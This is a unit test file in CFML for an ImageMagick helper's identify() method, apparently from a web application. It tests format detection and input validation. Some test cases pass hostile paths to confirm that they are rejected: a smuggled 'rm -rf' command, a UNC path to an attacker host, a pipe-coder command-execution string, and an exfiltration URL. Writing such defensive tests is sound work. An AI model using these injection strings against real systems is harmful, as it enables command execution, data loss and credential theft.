component extends="tests.resources.baseTest" {

    function beforeAll() {
        super.beforeAll();
        imageService = getInstance('Helpers@ImageMagick');
    }

    function afterAll() {
        super.afterAll();
    }

    function run() {
        describe('identify()', () => {
            beforeEach(() => {
                setup();
            });

            it('Identifies a heic image and returns its detected format', () => {
                expect(imageService.identify(expandPath('/tests/resources/heic_example.heic'))).toBe('HEIC');
            });

            it('Identifies a jpg image and returns its detected format', () => {
                expect(imageService.identify(expandPath('/tests/resources/jpg_example.jpg'))).toBe('JPEG');
            });

            it('Identifies a jpeg image and returns its detected format', () => {
                expect(imageService.identify(expandPath('/tests/resources/jpeg_example.jpeg'))).toBe('JPEG');
            });

            it('Identifies a png image and returns its detected format', () => {
                expect(imageService.identify(expandPath('/tests/resources/png_example.png'))).toBe('PNG');
            });

            it('Identifies a file by its actual content rather than its (spoofed) extension', () => {
                // spoofed_example.png is real jpg_example.jpg bytes saved under a .png name
                expect(imageService.identify(expandPath('/tests/resources/spoofed_example.png'))).toBe('JPEG');
            });

            it('Throws for a file that is not actually a valid image', () => {
                expect(() => imageService.identify(expandPath('/tests/resources/invalid_example.jpg'))).toThrow('ImageMagick.IdentifyException');
            });

            it('Throws for an empty path', () => {
                expect(() => imageService.identify('')).toThrow('ImageMagick.InputValidationException');
            });

            it('Throws for a path that does not exist', () => {
                expect(() => imageService.identify(expandPath('/tests/resources/does_not_exist.jpg'))).toThrow('ImageMagick.InputValidationException');
            });

            it('Throws for a path containing a double-quote character', () => {
                expect(() => imageService.identify('#expandPath('/tests/resources/jpg_example.jpg')#"; rm -rf /tmp')).toThrow('ImageMagick.InputValidationException');
            });

            it('Throws for a path using a UNC network path (SSRF/credential-leak via forced SMB auth)', () => {
                expect(() => imageService.identify('\\attacker.test\share\evil.jpg')).toThrow('ImageMagick.InputValidationException');
            });

            it('Throws for a path starting with a pipe (ImageMagick PIPE coder command execution)', () => {
                expect(() => imageService.identify('|touch /tmp/pwned')).toThrow('ImageMagick.InputValidationException');
            });

            it('Throws for a path using an ImageMagick coder/protocol prefix (SSRF via https:/label:/mpr: delegates)', () => {
                expect(() => imageService.identify('https://attacker.test/exfil')).toThrow('ImageMagick.InputValidationException');
            });
        });
    }

}
